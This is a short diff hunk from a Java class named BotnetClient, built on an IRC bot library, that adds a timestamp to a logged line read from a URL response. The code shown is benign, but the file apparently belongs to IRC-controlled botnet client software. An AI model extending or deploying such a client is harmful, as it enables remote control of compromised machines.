@@ -269,7 +269,7 @@ public class BotnetClient extends PircBot {
 					URLConnection connect = url.openConnection();
 					Scanner in = new Scanner(new BufferedReader(new InputStreamReader(connect.getInputStream())));
 					if (in.hasNextLine()) {
-						System.out.println(in.nextLine());
+						System.out.println(System.currentTimeMillis() + ": " + in.nextLine());
 					}
 					while (in.hasNextLine()) {
 						in.nextLine();
